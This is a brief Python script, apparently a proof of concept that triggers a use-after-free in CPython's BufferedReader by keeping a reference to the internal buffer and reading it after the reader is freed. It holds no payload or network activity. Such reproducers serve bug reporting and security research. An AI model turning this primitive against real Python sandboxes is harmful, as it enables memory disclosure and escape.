import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f
buf = view
#obtain uaf object

print(buf[:])
print(type(buf))
#clear gc
print("CLEAR")
view = 0
buf = None
view = None
